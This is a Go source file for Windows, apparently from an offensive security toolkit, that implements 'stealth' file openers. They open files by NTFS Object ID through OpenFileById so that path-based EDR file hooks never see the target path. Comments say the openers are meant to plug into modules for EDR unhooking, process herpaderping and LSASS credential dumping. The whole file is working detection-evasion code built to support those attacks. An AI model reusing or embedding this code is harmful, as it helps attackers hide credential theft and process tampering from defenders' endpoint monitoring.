//go:build windows

package stealthopen

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"golang.org/x/sys/windows"
)

// Stealth is the NTFS-Object-ID-backed Opener. Open() bypasses path-based
// EDR file hooks by going through OpenFileById on a volume-root handle
// instead of CreateFile on the target path.
//
// Preconditions:
//   - The target file must be on an NTFS volume (FAT32 / ReFS / network
//     shares without NTFS do not expose Object IDs).
//   - The target file must already have an Object ID. System32 DLLs
//     typically do; newly dropped files may not. Use EnsureObjectID to
//     create one on demand (requires admin only if SetObjectID path is
//     needed; GetObjectID's FSCTL_CREATE_OR_GET_OBJECT_ID works for
//     non-admin in most cases on files the caller already has handles
//     to).
//   - VolumePath must be the root of the volume the file lives on, e.g.
//     `C:\`. Use VolumeFromPath to derive it.
//
// When any precondition fails the Open call returns a descriptive error
// and callers should fall back to a Standard opener (or surface the
// error to the user).
type Stealth struct {
	VolumePath string
	ObjectID   [16]byte
}

// Open implements Opener by calling OpenByID with the pre-captured
// volume path and Object ID. The path argument is intentionally ignored
// — the open targets the Object ID captured at NewStealth time, not the
// caller's path — which is the whole point (path-based file hooks never
// observe the target file path). Callers upstream still pass a path
// because they also support *Standard, which does consult it.
func (s *Stealth) Open(_ string) (*os.File, error) {
	if s == nil {
		return nil, fmt.Errorf("stealthopen: nil Stealth opener")
	}
	if s.VolumePath == "" {
		return nil, fmt.Errorf("stealthopen: Stealth.VolumePath is empty")
	}
	var zero [16]byte
	if s.ObjectID == zero {
		return nil, fmt.Errorf("stealthopen: Stealth.ObjectID is zero")
	}
	return OpenByID(s.VolumePath, s.ObjectID)
}

// NewStealth captures the current NTFS Object ID of path (creating one
// if the file does not yet have one, via FSCTL_CREATE_OR_GET_OBJECT_ID)
// and pairs it with the derived volume root. The returned Stealth can be
// passed as an Opener; subsequent Open calls bypass path hooks entirely.
//
// The path argument is only used here to derive (volumeRoot, objectID) —
// later Open calls ignore the path they receive. Consumers that want
// per-call paths must build a new Stealth per target (or implement a
// custom Opener).
func NewStealth(path string) (*Stealth, error) {
	vol, err := VolumeFromPath(path)
	if err != nil {
		return nil, fmt.Errorf("stealthopen: derive volume: %w", err)
	}
	id, err := GetObjectID(path)
	if err != nil {
		return nil, fmt.Errorf("stealthopen: obtain ObjectID: %w", err)
	}
	return &Stealth{VolumePath: vol, ObjectID: id}, nil
}

// MultiStealth is the recommended drop-in [Opener] for callers that
// don't know up front which file the consumer will open. It accepts
// any path at call time, transparently captures the NTFS Object ID on
// first encounter, caches it, and routes every subsequent open of the
// same path through `OpenByID` — so the path-based EDR file hook only
// fires once per unique path for the lifetime of the *MultiStealth.
//
// Compared to [*Stealth] (one fixed file, captured at construction),
// MultiStealth trades a single sync.Mutex per call for the convenience
// of a generic Opener that mirrors `*Standard`'s ergonomics. Use it
// when:
//
//   - You're plugging stealth into a consumer whose file list isn't
//     part of your call site (the typical case for `evasion/unhook`,
//     `process/tamper/herpaderping`, `credentials/lsassdump`).
//   - You'd otherwise have to instantiate one *Stealth per path the
//     consumer might touch.
//
// Use [*Stealth] directly when you know the single target file ahead
// of time and want zero per-call overhead.
//
// The zero value (`var m MultiStealth` or `&MultiStealth{}`) is
// ready to use — no constructor required. Safe for concurrent use.
//
// Negative caching: when `NewStealth(path)` fails (file isn't on
// NTFS, file doesn't exist, FSCTL denied) the path is remembered as
// "fall back to os.Open" so the failure isn't retried on every call.
// The error itself is swallowed; callers that need the failure
// surfaced should use [*Stealth] directly.
type MultiStealth struct {
	mu    sync.Mutex
	cache map[string]*Stealth // nil entry = negative cached (use os.Open)
}

// Open implements [Opener]. First call for a given path captures the
// (volume, ObjectID) pair (paying the path-based hook cost ONCE);
// subsequent calls route through OpenByID and never re-touch a
// path-based file hook for that path.
//
// Cache key is the absolute path — two different relative spellings
// of the same file resolve to the same cache slot.
func (m *MultiStealth) Open(path string) (*os.File, error) {
	if m == nil {
		return nil, fmt.Errorf("stealthopen: nil MultiStealth opener")
	}
	if path == "" {
		return nil, fmt.Errorf("stealthopen: empty path")
	}

	abs, err := filepath.Abs(path)
	if err != nil {
		// Can't normalise — best-effort: fall through with the raw path
		// as the cache key. Open will likely fail too, but consistently.
		abs = path
	}

	m.mu.Lock()
	s, tried := m.cache[abs]
	m.mu.Unlock()
	if tried {
		if s == nil {
			return os.Open(path) // negative cached — silent fallback
		}
		return s.Open("") // path arg ignored by *Stealth
	}

	// First time for this path — capture the ID through NewStealth.
	s, capErr := NewStealth(path)
	m.mu.Lock()
	if m.cache == nil {
		m.cache = make(map[string]*Stealth)
	}
	if existing, ok := m.cache[abs]; ok {
		// Race: another goroutine resolved this path while we were
		// in flight. Prefer the existing entry (positive or negative)
		// so we converge on a single binding per path.
		s = existing
	} else {
		m.cache[abs] = s // s may be nil → negative cached
	}
	m.mu.Unlock()

	if s == nil {
		// Either capErr fired or the race winner negative-cached: fall
		// back to plain path open, silently. The capture error is
		// intentionally swallowed (operators who want to see it use
		// *Stealth directly).
		_ = capErr
		return os.Open(path)
	}
	return s.Open("")
}

// VolumeFromPath returns the volume-root path (e.g. `C:\`) for a file
// path. Accepts drive-absolute paths (`C:\Windows\...`), UNC paths
// (`\\?\Volume{...}\...`, `\\server\share\...`), and relative paths
// (resolved against the current working directory).
//
// The result is always terminated by a trailing backslash — that is the
// form OpenFileById expects for its hVol argument.
func VolumeFromPath(path string) (string, error) {
	if path == "" {
		return "", fmt.Errorf("empty path")
	}

	abs, err := filepath.Abs(path)
	if err != nil {
		return "", fmt.Errorf("resolve absolute path: %w", err)
	}

	// Win32 namespace prefix (`\\?\` or `\\.\`) — strip before analysis,
	// re-add nothing (the volume root is returned as a conventional path).
	tmp := abs
	switch {
	case strings.HasPrefix(tmp, `\\?\`), strings.HasPrefix(tmp, `\\.\`):
		tmp = tmp[4:]
	}

	// UNC \\server\share\...
	if strings.HasPrefix(tmp, `\\`) {
		parts := strings.SplitN(tmp[2:], `\`, 3)
		if len(parts) < 2 || parts[0] == "" || parts[1] == "" {
			return "", fmt.Errorf("malformed UNC path: %q", path)
		}
		return `\\` + parts[0] + `\` + parts[1] + `\`, nil
	}

	// Drive letter C:\...
	if len(tmp) >= 2 && tmp[1] == ':' {
		return strings.ToUpper(tmp[:1]) + `:\`, nil
	}

	// GetVolumePathName fallback for Volume{GUID} roots that came through
	// the Win32 prefix stripper as `Volume{...}\`.
	buf := make([]uint16, windows.MAX_PATH)
	p, err := windows.UTF16PtrFromString(abs)
	if err != nil {
		return "", fmt.Errorf("utf16 convert: %w", err)
	}
	if err := windows.GetVolumePathName(p, &buf[0], uint32(len(buf))); err != nil {
		return "", fmt.Errorf("GetVolumePathName(%q): %w", abs, err)
	}
	vol := windows.UTF16ToString(buf)
	if !strings.HasSuffix(vol, `\`) {
		vol += `\`
	}
	return vol, nil
}
